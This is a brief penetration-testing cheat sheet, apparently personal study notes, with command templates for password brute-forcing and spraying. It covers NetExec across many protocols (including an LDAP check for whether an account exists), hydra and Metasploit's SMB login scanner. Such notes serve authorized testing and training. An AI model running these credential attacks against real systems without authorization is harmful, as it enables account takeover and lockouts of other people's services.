For different kind of protocols, we can use different Tools to perform password bruteforcing / spraying attack

Using NetExec(SMB, SSH, LDAP, FTP, WMI, WinRM, RDP, VNC, MSSQL, and NFS):

-NetExec Basic syntax:
```
netexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist> -t <threadcount>
```

-Check if user account exist in AD via LDAP:
```
nxc ldap <target> -u <username> -p '' --no-smb
```

Using hydra(smb, ssh, rdp, extra 50+ protocol):
```
hydra -L <userlist> -P <passwordlist> <protocol>://<ip>:<port> -t <thread>
#or when single password / username is used
hydra -u <username> -p <password> <protocol>://<ip>:<port> -t <thread>
#Note: Hydra default threadcount == 16
```

Using Metasploit (smb)
```
use auxiliary/scanner/smb/smb_login
set user_file <userlist>
set pass_file <passwordlist>
set rhosts <ip>
exploit
```

